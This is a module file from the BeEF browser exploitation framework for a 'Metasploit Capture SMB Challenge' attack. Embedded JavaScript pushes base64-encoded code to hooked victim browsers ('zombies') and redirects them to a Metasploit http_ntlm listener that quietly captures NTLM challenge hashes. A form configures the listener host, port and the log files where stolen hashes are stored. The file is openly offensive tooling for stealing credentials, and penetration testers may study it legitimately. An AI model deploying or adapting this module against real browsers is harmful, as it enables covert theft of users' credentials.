<?
        // Copyright (c) 2009, Ryan Linn (sussurro@happypacket.net)
        // All Rights Reserved
        // Template for code by:
        // wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
	
?>

<!--

BeEF: the following is the boiler plate from the exploit

-->
<script language="javascript" type="text/javascript">
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function($url) {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		b64code = b64replace(b64code, "URL",$url);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Metasploit Capture SMB Challenge</div>
This module launches a Metasploit listener that attempts to quietly steal SMB Challenge hashes.  Once the Metasploit module has been launched, the targeted zombies will be redirected to Metasploit to attempt to capture credentials.
<div id="module_subsection">
	<form name="myform" id="myform">
                <input type=hidden name="msfAuxiliary" value="server/capture/http_ntlm"/>

		<div id="module_subsection_header">Options</div>
		<hr>
		<div id="module_subsection_header">SRVHOST (Required)</div>
		<input type="text" name="SRVHOST" value="0.0.0.0"/>
		<div id="module_subsection_header">SRVPORT (Required)</div>
		<input type="text" name="SRVPORT" value="8080"/>
		<div id="module_subsection_header">URIPATH (Default is random)</div>
		<input type="text" name="URIPATH" value=""/>
		<div id="module_subsection_header">LOGFILE (The local filename to store captured hashes) </div>
		<input type="text" name="LOGFILE" value=""/>
		<div id="module_subsection_header">PWFILE (The local filename to store captured hashes in Cain &amp; Able format) </div>
		<input type="text" name="PWFILE" value=""/>

		<input class="button" type="button" value="exploit" onClick="javascript:msf_callAuxiliary()"/>
	</form>
</div>

